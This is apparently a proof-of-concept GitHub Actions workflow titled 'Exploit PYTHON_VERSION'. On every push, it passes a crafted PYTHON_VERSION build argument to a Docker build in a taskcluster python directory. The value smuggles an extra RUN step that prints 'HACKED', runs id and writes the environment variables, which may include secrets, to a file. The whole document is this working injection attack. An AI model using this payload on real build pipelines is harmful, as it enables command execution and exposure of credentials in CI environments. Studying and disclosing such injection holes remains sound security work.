name: Exploit PYTHON_VERSION
on: push

jobs:
  hack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Trigger RCE via PYTHON_VERSION
        run: |
          # Inject a malicious PYTHON_VERSION with shell commands
          MALICIOUS_ARG="3.11-alpine; RUN echo 'HACKED: ' && id && env > /env"
          docker build \
            --build-arg PYTHON_VERSION="$MALICIOUS_ARG" \
            -t hacked \
            ./taskcluster/docker/python
